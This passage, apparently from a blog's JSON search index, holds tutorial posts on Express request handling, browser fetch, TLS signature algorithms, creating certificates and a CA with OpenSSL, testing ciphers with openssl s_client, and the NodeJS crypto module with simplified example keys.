Parameter like this /user/:userId. Route parameters are accessible using req.params. This returns an object of all the route parameters. Using req.params.userId will return 53.// Route with a Route Parameterapp.get('/user/:userId', (req, res) =&gt; {\t// For the URI: /user/53\tconsole.log(req.params); // { userId: '53' };\tconsole.log(req.params.userId) // '53'\tres.sendStatus(200);});// Multiple Route Parametersapp.get('/light/:lightbulbId/:action', (req, res) =&gt; {\t// For the URI: /light/17/off\tconsole.log(req.params); // { lightbulbId: '17', action: 'off' };\tconsole.log(`Light ${req.params.lightbulbId} will be turned ${req.params.action}`) // 'Light 17 will be turned off'\tres.sendStatus(200);});Query ParametersQuery Parameters can be supplied by the client can be accessed using req.query. An object containing all the query parameters will be returned:// Query Parameters Exampleapp.get('/search', (req, res) =&gt; {\t// For the URI: /search?firstName=John&amp;lastName=Smith\tconsole.log(req.query) // { firstName: 'John', lastName: 'Smith' }\t// Send custom HTTP Status code\tres.sendStatus(200);});CookiesWe can set a cookie in the response by using the cookie method: The first parameters is the cookie name MyCookie. The second is the cookie value abcdefghijklmnopqrstuvwxyz. The third is an object of cookie attributes.After using the cookie method, either send or sendStatus must be called as well to return the result.app.get('/home', (req, res) =&gt; {\tres.cookie('MyCookie', 'abcdefghijklmnopqrstuvwxyz', {\t\tmaxAge: 3600000, // Time in milliseconds: 3600000 = 1 Hour\t\tdomain: 'localhost',\t\tpath: '/',\t\tsecure: false, \t\thttpOnly: true,\t\tsameSite: 'strict'\t}).send({ success: true });});Multiple cookies can be set by calling the cookie method multiple times.JSON BodyIf the client has sent us data in JSON format, here is how we can access that data from the request: req.body will return the JSON data in the request body in the form of an object. NOTE 1: if req.body is undefined, ensure that you have app.use(bodyParser.json()); in your code. NOTE 2: if req.body is an empty object, ensure that the Content-Type in the request header is application/json.// Login APIapp.post('/login', (req, res) =&gt; {\tconsole.log(req.body); // { username: 'John123', password: 'Password_ThatShouldNotBeGuessed641'}\tconsole.log(req.body.username); // 'John123'\tconsole.log(req.body.password); // 'Password_ThatShouldNotBeGuessed641'\tlet loginSuccessful = false;\tif (req.body &amp;&amp; req.body.username &amp;&amp; req.body.password) {\t\t// Insert Authentication logic here\t\tloginSuccessful = checkLogin(req.body.username, req.body.password)\t}\tif (loginSuccessful) {\t\t// Login Successful, set a Cookie in the response\t\tres.cookie('auth-token', 'kln450x02sl5gusnh3mpu0s7ca2jfsaf8h', {\t\t\tmaxAge: 3600000, \t// Time in milliseconds: 3600000 = 1 Hour\t\t\thttpOnly: true,\t\t\tsameSite: 'lax'\t\t}).send({ success: true });\t} else {\t\t// Login Failed\t\tres.send({ success: false });\t}});More Advanced StuffCustom HeadersCustom response headers can be added using the header method to add controls such as CORS, HSTS, CSP, etc: The first parameter is the header name. The second parameter is the header value.app.get('/home', (req, res) =&gt; {\tres.header('Access-Control-Allow-Origin', 'http://127.0.0.1:8080');\tres.sendFile(path.join(__dirname, 'index.html'));});Next RouteA common situation that can occur is when you need to do the same thing in multiple routes. An example of this might be adding a header, or checking if a user is authenticated.Adding these headers/checks in every route is bad practice and can lead to security issues if you forget to add it in one of routes.Luckily there is a better way:// Route 1app.use((req, res, next) =&gt; {\tres.header('Custom-Header', 'NodeJS Server');\tnext();})// Route 2app.get('/home', (req, res) =&gt; {\tres.sendFile(path.join(__dirname, 'index.html'));});// Route 3app.use((req, res, next) =&gt; {\t// Insert logic to check if the user's cookie is valid\tlet authed = true;\tif (authed) {\t\tnext();\t} else {\t\tres.sendStatus(404);\t}})// Route 4app.get('/authed/home', (req, res) =&gt; {\tres.sendFile(path.join(__dirname, 'home.html'));});The use function matches every route, so putting a app.use before all other routes will ensure it gets called first.When we request /home the following will happen: Route 1 is be matched, custom response header is be added, and the next function is called. The next function means the route is finished doing what it needs to, but it doesn’t want to send a response. Express will continue checking for the next route that matches. Route 2 is matched and returns index.html, completing the request.When we request /authed/home the following will happen: Route 1 is be matched, custom response header is be added, and the next function is called. Route 2 is NOT matched. Route 3 is matched. This route checks to see if the user authorized to view the subsequent pages. If yes, then next is called. If not, then a 404 is sent to the client. If the user is authorised, then Route 4 is matched and returns home.html, completing the request." }, { "title": "JavaScript Fetch", "url": "/posts/javascript-fetch/", "categories": "javascript", "tags": "javascript, web, http, https", "date": "2021-04-09 17:32:40 +1000", "snippet": "In this post we’ll look at how to use the fetch command in JavaScript in the browser with some common use cases and examples. Making Requests GET Request POST Request Include Co...", "content": "In this post we’ll look at how to use the fetch command in JavaScript in the browser with some common use cases and examples. Making Requests GET Request POST Request Include Cookies for Cross-Domain Requests Custom Headers Response Data Accessing Response Data Response Headers &amp; Status Making RequestsGET Requestfetch('/home');POST Request// The JSON data that will be sent in our POST requestlet apiData = { username: 'username', password: 'password' };fetch('/login', { \tmethod:'POST',\theaders: {\t\t'Content-Type': 'application/json'\t},\tbody: JSON.stringify(apiData)});Include Cookies for Cross-Domain Requests// The current origin is \"https://my-domain.com\".// Cookies for \"my-domain.com\" will be sent in the request.fetch('/home');// Cookies for \"testing.com\" WILL NOT be sent in the request.fetch('https://testing.com/home');// Cookies for \"testing.com\" WILL be sent in the request (assuming the SameSite attribute permits it).fetch('https://testing.com/home', {\tcredentials: 'include'});Custom Headersfetch('/home', {\theaders: {\t\t'Custom-Header-1': 'My Custom Header 1',\t\t'Custom-Header-2': 'My Custom Header 2',\t\t'Authorization': ' Bearer myToken',\t},});Response DataAccessing Response DataUsing then/catch/finallyfetch('/api/v1/user').then(response =&gt; \tresponse.json()\t// .text() is valid if you want the data as a string instead.).then(data =&gt; {\tconsole.log(data); // { userId: 1, username: \"admin\" }}).catch(err =&gt; {\tconsole.error(err);});Using Async &amp; Awaitlet responseData = await fetch('/api/v1/user');responseData = await responseData.json();console.log(responseData); // { userId: 1, username: \"admin\" }Response Headers &amp; Statuslet response = await fetch('/api/v1/user');// Get the HTTP response codeconsole.log(response.status);// Get a single headerconsole.log(response.headers.get('content-type'));// Loop over all headers &amp; valuesresponse.headers.forEach((value, header) =&gt; {\tconsole.log(header, value);}); Set-Cookie header will NOT be accessible. It’s removed by the browser for security." }, { "title": "TLS Server Signature Algorithm", "url": "/posts/tls-server-signature-algorithm/", "categories": "security, certificates", "tags": "tls, security, certificate, openssl, host, cryptography, https, signature, algorithm", "date": "2021-04-08 17:30:12 +1000", "snippet": "In this post we’ll look at what the TLS Server Signature Algorithm is for.This guide can get technical at times so it’s recommended that you understand the follow terms as they are assumed knowledg...", "content": "In this post we’ll look at what the TLS Server Signature Algorithm is for.This guide can get technical at times so it’s recommended that you understand the follow terms as they are assumed knowledge: RSA (Rivest–Shamir–Adleman) ECC (Elliptic-Curve-Cryptography) Symmetric Cryptography (i.e. AES) Asymmetric Cryptography (Public/Private Key pair) DH &amp; ECDH (Diffie-Hellman &amp; Elliptic-Curve Diffie-Hellman) Hash Function (i.e. SHA1, SHA256, SHA512) CA (Certificate Authority) Host Certificate (Certificate used for a web-server)Contents SSLScan Results SSL Certificate Section Breakdown What are Server Signature Algorithms? Server Signature Algorithm Breakdown Edge Case 1 SSLScan False Positives Verifying False Positives Edge Case 2 Dual Certificates How does this make sense? ConclusionSSLScan ResultsBelow we have the Server Signature Algorithm(s) and SSL Certificate sections from a SSLScan of a web server:SSL Certificate Section BreakdownThe Signature Algorithm: sha384WithRSAEncryption line indicates that the Private Key used to sign this Host Certificate is an RSA key, and the hash function used for the integrity check is SHA384. This line DOES NOT tell us anything about the Host Certificate, only what was used to sign it (i.e. the CA).The line RSA Key Strength: 4096 tells us what type of algorithm was used to create the Host Certificate Keys. In this case it was RSA with a 4096-bit key. This is important because we now know that the Private Key for this Host Certificate is an RSA key, rather than an ECC key.What are Server Signature Algorithms used for?When using TLS, messages sent by the client and server are encrypted using symmetric keys. To do this the client and server both need to be able to calculate the same symmetric keys. This is achieved by exchanging Public keys (using DH or ECDH) during the TLS connection setup. These Public keys are NOT the same as the Host Certificate Public key, these keys are ephemeral (temporary) and are randomly generated at the start of each new connection to provide Perfect Forward Secrecy.During the connection setup phase, the server must generate a Public/Private key pair and send the Public key to the client. However, since this Public key has just been generated, it’s not safe to sent to the client as is. This is because the client has no proof that the key was generated by the server. To solve this the server hashes and signs this new ephemeral Public key using the Private key of the Host Certificate.Below is a diagram of how the signing and verification works. The ephemeral Public key as well as some other information sent during the TLS connection setup is the input data for the Hash Function. The resulting hash is then encrypted using the Private key of the Host Certificate to produce a signature (left diagram). The ephemeral Public key and the signature are then sent to the client. The client can verify that that ephemeral Public key is from the server by checking the signature. The signature verification can be done using the Host Certificate Public key (right diagram).We can now ready to understand the Server Signature Algorithm(s) section of the SSLScan. The algorithms listed are the algorithms that the server supports for signing the ephemeral Public Key in the process that was explained above.Server Signature Algorithm BreakdownBelow we have the same scan results as above just with one of the algorithms highlighted. Let’s break down what the highlight algorithm means.rsa_pkcs1_sha256 means that the ephemeral Public key will be encrypted using RSA. PKCS1 indicates the standard that is being used. SHA256 is the hashing algorithm that is used for the integrity check of the data.Notice that all of the Server Signature Algorithms have something in common. They all use RSA. So why are they all RSA and not ECDSA or DSA?Remember earlier we said the Host Certificate uses RSA by observing the SSL Certificate section. This means the Host Private key is an RSA key. Therefore, when we encrypt something using the Host Private key, it must use RSA encryption.To think about it another way, let’s imagine that one of the algorithms listed in the Server Signature Algorithm(s) section said it uses ECDSA instead of RSA. This would imply that the ephemeral Public key sent during the TLS setup was signed using an ECC key. This is not possible because the Host Private key is an RSA key not an ECC key.Edge Case 1SSLScan False PositivesUnfortunately SSLScan is not perfect, and sometimes we get incorrect results. Let’s look at how to identify false positives and found out the correct results.Have a look at the SSLScan results of adventofcode.com below. See if you can identify what is wrong:From the SSL Certificate section we can see that this Host Certificate is RSA. Because of this, and what we learnt about what the Signature Algorithms are for, it doesn’t make sense for there to be ECDSA or DSA algorithms.If this happens then there has most likely been an error with SSLScan. We can verify the results using manually using openssl. Let’s see how to do that now.Verifying False PositivesUsing openssl we can connect to a target and specify the Signature Algorithm we wish to use. If you’re unsure how to do this, I have a quick guide with all the commands here:Testing dsa_sha256:Testing ecdsa_secp256r1_sha256:Testing rsa_pkcs1_sha256:Skipping over some of the output:At the end of the Certificate we can see the information about the Server Signature. The Peer signing digest: is set to SHA256, which is the hash function we specified. The Peer signature type: is set to RSA which is also what we specified.From the above outputs we can see that the server does indeed only supported RSA Signature Algorithms (as it should). We now know there were false positives within the SSLScan.Edge Case 2Dual CertificatesBelow is the SSLScan results of facebook.com below. Just like the first edge case we can see that there are signature algorithms that don’t match the host certificate. The Host Certificate is ECC and it doesn’t make sense for there to be RSA algorithms under the Server Signature Algorithm(s) section.Using the same process as the first edge case, let’s see what’s happening:Testing rsa_pkcs1_sha256:openssl s_client -connect facebook.com:443 -sigalgs \"RSS-PSS+SHA256\"Skipping to the end of the certificate output:Testing ecdsa_secp256r1_sha256:openssl s_client -connect facebook.com:443 -sigalgs \"ECDSA+SHA256\"Skipping to the end of the certificate output:This output is perplexing. Why did both signature algorithms work when the certificate is ECC?How does this make sense?As always, the devil is in the details. If we closely examine the output from both commands you can see that the certificates returned are different!This makes more sense. The server is sending us a different certificate based on what signature algorithm is used. When we use an RSA Signature Algorithm, we get an RSA Certificate. When we use an ECC Signature Algorithm, we get an ECC Certificate.Conclusion The Signature Algorithm is used for encrypting and signing the ephemeral public key during the TLS connection setup. SSLScan is not 100% reliable. OpenSSL should be used to verify results manually if the results don’t appear to make sense.References TLSv1.2 Illustration TLSv1.2 RFC" }, { "title": "OpenSSL Creating a Host Certificate", "url": "/posts/openssl-creating-a-host-certificate/", "categories": "security, certificates", "tags": "openssl, certificate, host, security, cryptography, https", "date": "2021-04-07 21:03:48 +1000", "snippet": "In this post we’ll look at how to create our own Host Certificates using OpenSSL. These certificates can be used on web-servers for enabling TLS.A valid CA Certificate and Private key will be requi...", "content": "In this post we’ll look at how to create our own Host Certificates using OpenSSL. These certificates can be used on web-servers for enabling TLS.A valid CA Certificate and Private key will be required to follow this tutorial. If you do not have these, you can create them by following this guide. Generating a Private Key List OpenSSL Support Elliptic Curves Elliptic Curve Private Key RSA Private Key Generating a Certificate Signing Request (CSR) CSR Configuration File Creating the CSR Generating a Certificate Configuration File Signing the CSR Using the CertificateGenerating a Private KeyThe first step is to create a Private key for our certificate. We can choose either an RSA key or an Elliptic Curve key.List OpenSSL Supported Elliptic CurvesThe following command will display a list of supported OpenSSL elliptic curves. We’ll need to choose one of these curves when we are generating our Private key.openssl ecparam -list_curvesElliptic Curve Private Keyopenssl ecparam -genkey -name secp384r1 -out host.key secp384r1 is the name of the curve we are using. host.key is the name of the output file where we want to store the Private key.RSA Private KeyThe following command will generate a 2048-bit RSA key:openssl genrsa -out host.key2048-bits is the standard size. A custom key size can be specified by giving an extra argument. The following command will generate a 4096-bit RSA key:openssl genrsa -out host.key 4096Generating a Certificate Signing Request (CSR)CSR Configuration FileWe need to specify some parameters for our certificate before we can create it.Create a file called host.conf and add the following:[req]default_md = sha512basicConstraints = CA:FALSEkeyUsage = nonRepudiation, digitalSignature, keyEncipherment[req]distinguished_name = req_distinguished_namereq_extensions = req_extprompt = no[req_distinguished_name]C = AUST = VictoriaL = MelbourneO = My CompanyOU = My DivisionCN = testing.com[req_ext]subjectAltName = @alt_names[alt_names]DNS.1 = testing.comDNS.2 = *.testing.com Customize the C, ST, L, O, OU and CN to your desired values.The CN (Common Name) field will be displayed when your computer shows the certificate path:The DNS.* fields represent other domains that this certificate will also be valid for. Remember that a certificate valid for *.testing.com is NOT valid for testing.com, so it must be added separately.Creating the CSRWe are now ready to create a certificate signing request (CSR) using the private key and config we just created. The CSR will then need to be signed by a CA before it can be used.openssl req -new -sha512 -nodes -key host.key -out host.csr -config host.confGenerating a CertificateConfiguration FileWe need to specify some extra parameters so that our final certificate will be fully trusted X.509 Cert.Create a file called host-ext.conf and add the following:basicConstraints = CA:FALSEnsCertType = servernsComment = \"My First Certificate\"subjectKeyIdentifier = hashauthorityKeyIdentifier = keyid,issuer:alwayskeyUsage = nonRepudiation, digitalSignature, keyEnciphermentextendedKeyUsage = serverAuthsubjectAltName = @alt_names[alt_names]DNS.1 = testing.comDNS.2 = *.testing.com Update the nsComment and DNS.* fields to your desired values.Signing the CSRWe are now ready to sign the CSR using a CA and 2nd config file we created. The output will be our Certificate that is ready to be used.openssl x509 -req -sha512 -days 45 -in host.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out host.crt -extfile host-ext.confUsing the CertificateThe output files host.key and host.crt are now ready to be used for a HTTPS server. If your browser trusts the Root CA that was used to sign the CSR then the host certificate will be valid and trusted." }, { "title": "OpenSSL Creating a Certificate Authority (CA)", "url": "/posts/openssl-creating-a-ca/", "categories": "security, certificates", "tags": "openssl, ca, certificate, security, cryptography", "date": "2021-04-07 19:17:22 +1000", "snippet": "In this post we’ll look at how to create our own Certificate Authority (CA) using OpenSSL. Generating a Private Key List OpenSSL Support Elliptic Curves Elliptic Curve Private Key ...", "content": "In this post we’ll look at how to create our own Certificate Authority (CA) using OpenSSL. Generating a Private Key List OpenSSL Support Elliptic Curves Elliptic Curve Private Key RSA Private Key Generating a Certificate Configuration File Creating the Certificate Using the CAGenerating a Private KeyThe first step is to create a Private key for our certificate. We can choose either an RSA key or an Elliptic Curve key.List OpenSSL Supported Elliptic CurvesThe following command will display a list of supported OpenSSL elliptic curves. We’ll need to choose one of these curves when we are generating our Private key.openssl ecparam -list_curvesElliptic Curve Private Keyopenssl ecparam -genkey -name secp384r1 -out ca.key secp384r1 is the name of the curve we are using. ca.key is the name of the output file where we want to store the Private key.RSA Private KeyThe following command will generate a 2048-bit RSA key:openssl genrsa -out ca.key2048-bits is the standard size. A custom key size can be specified by giving an extra argument. The following command will generate a 4096-bit RSA key:openssl genrsa -out ca.key 4096Generating a CertificateCA Configuration FileWe need to specify some parameters for our CA before we can create it.Create a file called ca.conf and add the following:basicConstraints = CA:TRUEkeyUsage = cRLSign, keyCertSign[req]distinguished_name = req_distinguished_nameprompt = no[req_distinguished_name]C = AUST = VictoriaL = MelbourneCN = My Personal Root CA Customize the C, ST, L and CN to your desired values.The CN (Common Name) field will be displayed when your computer shows the certificate path:Creating the CertificateWe are now ready to create the certificate using the private key and config:openssl req -x509 -new -sha512 -nodes -key ca.key -days 7307 -out ca.crt -config ca.conf -x509 output a Certificate instead of a Certificate Signing Request (CSR). -sha512 specifies the hash function that will be used to sign the certificate. Other values may be used here such as sha256 and sha384. -nodes means the certificate should be unencrypted. -key ca.key specifies the Private Key we are signing this with. -days 7307 specifies the number of days the certificate is valid for. 7307 days ≈ 20 years. -out ca.crt specifies the output file name. -config ca.conf specifies the configuration file we wish to use.Using the CANow that we have our own Certificate Authority, we can use it sign certificates for web-servers so they can use TLS. I have a guide to do this here.If we want to use the CA and not have certificate warnings, then it will have to be installed as a Trusted Root CA on your computer/browser." }, { "title": "OpenSSL Testing a Signature Algorithm", "url": "/posts/openssl-testing-signature-algorithm/", "categories": "security, certificates", "tags": "tls, security, cryptography, openssl, signature, algorithm", "date": "2021-04-07 00:44:00 +1000", "snippet": "In this post we’ll look at how to test whether a server supports a certain signature algorithm when using TLS. Testing RSA PKCS1 Signature Algorithm Testing RSA PSS RSAE Signature Algorithm Test...", "content": "In this post we’ll look at how to test whether a server supports a certain signature algorithm when using TLS. Testing RSA PKCS1 Signature Algorithm Testing RSA PSS RSAE Signature Algorithm Testing DSA Signature Algorithm Testing ECDSA Signature Algorithm Verifying ResultsBelow we have the SSLScan results of github.com. Let’s see how to verify if a certain signature algorithm is supported by the server.For all of the below commands SHA256 may be replaced with the desired hash function: SHA1 SHA224 SHA256 SHA384 SHA512Testing RSA PKCS1An example algorithm in this category is rsa_pkcs1_sha256:openssl s_client -connect HOST:PORT -sigalgs \"RSA+SHA256\"Testing RSA PSS RSAEAn example algorithm in this category is rsa_pss_rsae_sha256:openssl s_client -connect HOST:PORT -sigalgs \"RSA-PSS+SHA256\"Testing DSAAn example algorithm in this category is dsa_sha256:openssl s_client -connect HOST:PORT -sigalgs \"DSA+SHA256\"Testing ECDSAAn example algorithm in this category is ecdsa_secp256r1_sha256:openssl s_client -connect HOST:PORT -sigalgs \"ECDSA+SHA256\"Verifying ResultsWhen running one of the above commands you should see the certificate printed out, and below that you should see two fields Peer signing digest: and Peer signature type:. These will be the values that you provided to the -sigalgs parameter.If the certificate is NOT printed, then the signature algorithm you provided is not supported by the server.The below image is the output of the following command:openssl s_client -connect github.com:443 -sigalgs \"RSA-PSS+SHA256\"The highest version of TLS supported by the server will be used by default. If you want to test a signature algorithm for TLSv1.2 or TLSv1.3 you can use the flags -tls1_2 and -tls1_3 respectively:openssl s_client -connect github.com:443 -tls1_2 -sigalgs \"RSA-PSS+SHA256\"Notes Make sure you specify a port number at the end of the host name! SSLScan results can be incorrect. Some of the algorithms shown may not work. You can use the aforementioned commands to verify the results." }, { "title": "OpenSSL Testing a Cipher Suite", "url": "/posts/openssl-testing-cipher-suite/", "categories": "security, certificates", "tags": "security, cryptography, openssl, cipher, ciphersuite", "date": "2021-04-06 19:46:40 +1000", "snippet": "In this post we’ll look at how to test whether a server supports a certain cipher suite when using TLS. Testing Ciphers for TLSv1.2 &amp; Below Testing Other TLS Versions Testing T...", "content": "In this post we’ll look at how to test whether a server supports a certain cipher suite when using TLS. Testing Ciphers for TLSv1.2 &amp; Below Testing Other TLS Versions Testing TLSv1.3 CiphersBelow we have the SSLScan results of github.com. Let’s see how to manually verify if a certain cipher is valid.Testing Ciphers for TLSv1.2 &amp; Belowopenssl s_client -connect github.com:443 -tls1_2 -cipher AES128-SHA256Testing Other TLS VersionsIf we want to test ciphers for other versions of TLS such as v1.0 &amp; v1.1, we need to replace -tls1_2 in the above command with -tls1 and -tls1_1 respectively.Testing TLSv1.3 Ciphersopenssl s_client -connect github.com:443 -ciphersuites TLS_AES_128_GCM_SHA256When testing a TLSv1.3 cipher the version flag shouldn’t be required. However, if the wrong version is being used we can specify TLSv1.3 by using the -tls1_3 flag.Notes Make sure to specific a port number at the end of the host name. Depending on the version of OpenSSL installed, certain ciphers may or may not be supported." }, { "title": "NodeJS Crypto Module", "url": "/posts/nodejs-crypto/", "categories": "javascript, nodejs", "tags": "javascript, nodejs, security, cryptography", "date": "2021-04-06 18:37:40 +1000", "snippet": "In this post we’ll look at how to use some features of the crypto library built into NodeJS. We’ll look at how to do symmetric encryption (AES), hashing strings and files, and finally ECDH (Ellipti...", "content": "In this post we’ll look at how to use some features of the crypto library built into NodeJS. We’ll look at how to do symmetric encryption (AES), hashing strings and files, and finally ECDH (Elliptic-Curve Diffie-Hellman). Symmetric Encryption List Supported Ciphers Encrypt String with AES-128-ECB Encrypt String with AES-256-CBC Encrypt String with AES-256-GCM Hash Functions List Supported Hash Functions Hashing a String Example Hashing a File Example HMAC Generation Elliptic-Curve Diffie-Hellman List Supported Curves ECDH Example Symmetric EncryptionFor a quick refresher, Symmetric Encryption is when only a single key is used. The same key is used for both encryption and decryption of the data.Supported CiphersWe can see which ciphers are supported in NodeJS by using the following code:const crypto = require('crypto'); console.log(crypto.getCiphers()); crypto.getCiphers() returns a list of strings of all the ciphers that are supported. From the list we’ll choose aes-256-ctr. Let’s now see how to encrypt &amp; decrypt some data using our chosen mode.Encrypt String with AES-128-ECBconst crypto = require('crypto');let key = Buffer.from('ABCDEFGHIJKLMNOP', 'utf-8');// The Secret Messagelet secret_msg = Buffer.from('To be Encrypted!', 'utf-8');// Encryptlet cipher = crypto.createCipheriv('aes-128-ecb', key, null);let encryptedData = Buffer.concat([cipher.update(secret_msg), cipher.final()]);// Decryptlet decipher = crypto.createDecipheriv('aes-128-ecb', key, null);let decryptedData = Buffer.concat([decipher.update(encryptedData), decipher.final()]);console.log(`\\nEncryption Key: ${key.toString('hex')}`)console.log(`Plain-text: \\t\"${secret_msg}\"`);console.log(`Plain-text: \\t${secret_msg.toString('hex')}`);console.log(`Encrypted: \\t${encryptedData.toString('hex')}`);console.log(`Encrypted: \\t${encryptedData.toString('base64')}`);console.log(`Decrypted: \\t${decryptedData.toString('hex')}`);console.log(`Decrypted: \\t\"${decryptedData.toString('utf-8')}\"`); This is just an example, please don’t ever use ECB in practice.Encrypt String with AES-256-CBCconst crypto = require('crypto');let key = Buffer.from('ABCDEFGHIJKLMNOPabcdefghijklmnop', 'utf-8');let iv = Buffer.from('000102030405060708090a0b0c0d0e0f', 'hex');// The Secret Messagelet secret_msg = Buffer.from('To be Encrypted!', 'utf-8');// Encryptlet cipher = crypto.createCipheriv('aes-256-cbc', key, iv);let encryptedData = Buffer.concat([cipher.update(secret_msg), cipher.final()]);// Decryptlet decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);let decryptedData = Buffer.concat([decipher.update(encryptedData), decipher.final()]);console.log(`\\nEncryption Key: ${key.toString('hex')}`)console.log(`IV: \\t\\t${iv.toString('hex')}\\n`)console.log(`Plain-text: \\t\"${secret_msg}\"`);console.log(`Plain-text: \\t${secret_msg.toString('hex')}`);console.log(`Encrypted: \\t${encryptedData.toString('hex')}`);console.log(`Encrypted: \\t${encryptedData.toString('base64')}`);console.log(`Decrypted: \\t${decryptedData.toString('hex')}`);console.log(`Decrypted: \\t\"${decryptedData.toString('utf-8')}\"`);Encrypt String with AES-256-GCMconst crypto = require('crypto');let key = Buffer.from('ABCDEFGHIJKLMNOPabcdefghijklmnop', 'utf-8');let iv = Buffer.from('000102030405060708090a0b0c0d0e0f', 'hex');let authTagLength = 16;// The Secret Messagelet secret_msg = Buffer.from('To be Encrypted!', 'utf-8');// Encryptlet cipher = crypto.createCipheriv('aes-256-gcm', key, iv, { authTagLength });let encryptedData = Buffer.concat([cipher.update(secret_msg), cipher.final(), cipher.getAuthTag()]);// Separate the encrypted data from the Auth Taglet dataToDecrypt = encryptedData.slice(0, encryptedData.length - authTagLength);let authTag = encryptedData.slice(encryptedData.length - authTagLength, encryptedData.length);// Decryptlet decipher = crypto.createDecipheriv('aes-256-gcm', key, iv, { authTagLength });decipher.setAuthTag(authTag);let decryptedData = Buffer.concat([decipher.update(dataToDecrypt), decipher.final()]);console.log(`\\nEncryption Key: ${key.toString('hex')}`)console.log(`IV: \\t\\t${iv.toString('hex')}\\n`)console.log(`Plain-text: \\t\"${secret_msg}\"`);console.log(`Plain-text: \\t${secret_msg.toString('hex')}`);console.log(`Encrypted: \\t${encryptedData.toString('hex')}`);console.log(`Encrypted: \\t${encryptedData.toString('base64')}`);console.log(`Decrypted: \\t${decryptedData.toString('hex')}`);console.log(`Decrypted: \\t\"${decryptedData.toString('utf-8')}\"`);Note, the cipher and decipher objects created will automatically use PKCS padding. This can be disabled with the setAutoPadding function if needed.Hash FunctionsList Supported Hash FunctionsWe can see which hash functions are supported in NodeJS by using the following code:const crypto = require('crypto');console.log(crypto.getHashes());crypto.getHashes() returns a list of strings of all the hash functions that are supported.Hashing a String Exampleconst crypto = require('crypto');// String to be hashedlet msgToHash = 'Password1';// Create Hash Functionslet MD4_HashFunction = crypto.createHash('md4');let NTLM_HashFunction = crypto.createHash('md4');let SHA256_HashFunction = crypto.createHash('sha256');let SHA3_256_HashFunction = crypto.createHash('sha3-256');// Add data to the hash functionMD4_HashFunction.update(msgToHash);NTLM_HashFunction.update(Buffer.from(msgToHash, 'utf16le'));SHA256_HashFunction.update(msgToHash);SHA3_256_HashFunction.update(msgToHash);// Get the resultconsole.log('MD4:\\t\\t', MD4_HashFunction.digest('hex'));console.log('NTLM:\\t\\t', NTLM_HashFunction.digest('hex'));console.log('SHA256:\\t\\t', SHA256_HashFunction.digest('hex'));console.log('SHA3-256:\\t', SHA3_256_HashFunction.digest('hex'));The update function can be called multiple times before getting the output hash. For example:SHA256_HashFunction.update(\"Pass\");SHA256_HashFunction.update(\"word1\");is the same as:SHA256_HashFunction.update(\"Password1\");Hashing a File Exampleconst fs = require('fs');const path = require('path');const crypto = require('crypto');// Target file that we what to calculate the hash ofconst targetFile = path.join(__dirname, 'input-file.txt');// Create Hash Functionconst SHA256_HashFunction = crypto.createHash('sha256');SHA256_HashFunction.setEncoding('hex');// Create a read stream with the target fileconst inputFileStream = fs.createReadStream(targetFile);// Callback for when Hashing is completeinputFileStream.on('end', () =&gt; { SHA256_HashFunction.end(); console.log(SHA256_HashFunction.read());});// Read the file contents and pipe it into the hash objectinputFileStream.pipe(SHA256_HashFunction);HMAC GenerationIdeally a NIST approved hash function should be used: SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, &amp; SHA-512/256 SHA3-224, SHA3-256, SHA3-384, &amp; SHA3-512const crypto = require('crypto');// Create the HMAC Function with the desired hash function and key.const hmac = crypto.createHmac('sha3-256', 'MySecretKey');// Add data to the HMAChmac.update('My data');// Get the resultconsole.log('HMAC:', hmac.digest('hex'));Elliptic-Curve Diffie-HellmanSupported CurvesWe can see which curves are supported in NodeJS by using the following code:const crypto = require('crypto');console.log(crypto.getCurves());crypto.getCurves() returns a list of strings of all the elliptic curves that are supported. We’ll use the sect571k1 curve in the below example.ECDH Exampleconst crypto = require('crypto');const alice = crypto.createECDH('sect571k1');alice.generateKeys();const bob = crypto.createECDH('sect571k1');bob.generateKeys();// Alice's Dataconsole.log(\"\\nAlice Public:\", alice.getPublicKey().toString('base64'));console.log(\"Alice Private:\", alice.getPrivateKey().toString('base64'), \"\\n\");// Bob's Dataconsole.log(\"Bob Public:\", bob.getPublicKey().toString('base64'));console.log(\"Bob Private:\", bob.getPrivateKey().toString('base64'), \"\\n\");// The Shared Secret will be the sameconsole.log(\"Shared Secret: \", alice.computeSecret(bob.getPublicKey(), null, 'base64'));console.log(\"Shared Secret: \", bob.computeSecret(alice.getPublicKey(), null, 'base64'), \"\\n\");" } ]
